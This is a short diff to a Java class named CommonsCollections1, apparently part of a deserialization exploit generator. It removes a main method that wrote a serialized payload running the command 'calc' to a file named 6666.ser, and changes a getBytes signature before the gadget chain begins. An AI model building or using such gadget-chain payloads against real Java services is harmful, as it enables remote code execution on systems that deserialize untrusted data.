@@ -17,14 +17,8 @@ import java.util.HashMap;
 import java.util.Map;
 
 public class CommonsCollections1 {
-    public static void main(String[] args) throws Exception {
-        byte[]           bytes = getBytes(PayloadType.command, "calc");
-        FileOutputStream fous  = new FileOutputStream("6666.ser");
-        fous.write(bytes);
-        fous.close();
-    }
 
-    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public static byte[] getBytes(PayloadType type) throws Exception {
         final String[] execArgs = new String[]{String.valueOf(type)};
         // inert chain for setup
         final Transformer transformerChain = new ChainedTransformer(
